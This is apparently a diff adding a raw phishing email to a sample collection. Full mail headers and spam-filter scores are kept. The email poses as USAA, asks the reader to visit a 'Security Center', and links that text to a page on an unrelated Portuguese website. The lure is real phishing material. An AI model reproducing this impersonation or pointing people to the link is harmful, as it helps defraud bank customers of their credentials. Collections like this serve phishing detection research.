@@ -1,0 +1,76 @@
+Return-Path: <service00@vt.edu>
+X-Original-To: jose@login.monkey.org
+Delivered-To: jose@login.monkey.org
+Received: from forward.b.hostedemail.com (forward.b.hostedemail.com [64.98.36.17])
+	by l.monkey.org (Postfix) with ESMTP id 49FE8F4159
+	for <jose@login.monkey.org>; Mon, 20 Jul 2015 09:55:08 -0500 (CDT)
+Received: from smtpin12.hostedemail.com (10.5.19.248.rfc1918.com [10.5.19.248])
+	by ofarelay02.b.hostedemail.com (Postfix) with SMTP id 0E44427ABA1
+	for <jose@login.monkey.org>; Mon, 20 Jul 2015 14:55:08 +0000 (UTC)
+X-Forwarded-For: jose@monkey.org by Hostedemail
+Delivered-To: jose@monkey.org
+X-FDA: 70428934296.12.eggs71_fa57730a2d02
+Authentication-Results: auth.b.hostedemail.com; dkim=none
+	reason="no signature"; dkim-adsp=none (insecure policy);
+	dkim-atps=neutral
+X-Spam-Summary: 75,0,0,34375ce980af2d57,d41d8cd98f00b204,service00@vt.edu,:service00@vt.edu,RULES_HIT:41:72:152:355:379:962:967:973:983:988:989:1189:1208:1221:1260:1263:1313:1314:1345:1381:1431:1436:1437:1516:1517:1518:1534:1538:1560:1575:1588:1592:1594:1711:1714:1730:1749:1777:1792:1803:2194:2199:2525:2560:2563:2682:2685:2859:2890:2892:2894:2917:2926:2933:2937:2939:2942:2945:2947:2951:2954:3022:3138:3139:3140:3141:3142:3148:3690:3867:3868:3873:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:4250:4362:5007:6261:6688:8568:8599:9025:9388:9873:9908:10004:10049:10346:10400:11658:11914:12043:12776:13110:13237:14347:21080,0,RBL:158.130.68.124-irl.urbl.hostedemail.com-127.0.0.175,CacheIP:none,Bayesian:0.5,0.5,0.5,Netcheck:none,DomainCache:0,MSF:not bulk,SPF:fs,MSBL:0,DNSBL:neutral,Custom_rules:0:0:0
+X-HE-Tag: eggs71_fa57730a2d02
+X-Filterd-Recvd-Size: 2128
+Received: from fox.seas.upenn.edu (renard.seas.upenn.edu [158.130.68.124])
+	by imf09.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Mon, 20 Jul 2015 14:55:07 +0000 (UTC)
+Received: from Compostomaster.lrsm.upenn.edu (SEASNet-30-47.lrsm.upenn.edu [158.130.30.48])
+	by fox.seas.upenn.edu (8.14.5/8.14.5) with ESMTP id t6JCMkpr032194;
+	Sun, 19 Jul 2015 08:39:09 -0400
+Message-Id: <201507191239.t6JCMkpr032194@fox.seas.upenn.edu>
+Content-Type: multipart/alternative; boundary="===============1188189370=="
+MIME-Version: 1.0
+Subject: Security Preferences
+To: ";." <service00@vt.edu>
+From: "USAA" <service00@vt.edu>
+Date: Sun, 19 Jul 2015 08:38:35 -0400
+X-Proofpoint-Virus-Version: vendor=nai engine=5400 definitions=5800 signatures=585085
+X-PP-Spam-Details: rule=add_spam_details policy=default score=94 spamscore=94 ipscore=0
+ suspectscore=26 phishscore=0 bulkscore=39 adultscore=0 classifier=spam
+ adjust=0 reason=mlx scancount=1 engine=7.0.1-1111160001
+ definitions=main-1507190198
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 129
+
+You will not see this in a MIME-aware mail reader.
+--===============1188189370==
+Content-Type: text/plain; charset="utf-8"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+ To learn how USAA protects your information, visit our Security Center on =
+now. We value your business and are committed to keeping your accounts and =
+personal information safe and secure. =
+
+ =
+
+Thank you, =
+
+USAA=20
+--===============1188189370==
+Content-Type: text/html; charset="utf-8"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+<html><head><meta http-equiv=3D"Content-Type" content=3D"text/html; charset=
+=3Dutf-8"/></head>
+ To learn how USAA protects your information, visit our =
+
+ <a target=3D"_blank" href=3D"http://biblio.cm-azambuja.pt/aveiras/installa=
+tion/js/wp.htm">Security Center</a> on now. We value your business and are =
+committed to keeping your accounts and personal information safe and secure.
+ <br>
+ <br>Thank you,
+ <br>USAA
+
+</html>
+--===============1188189370==--
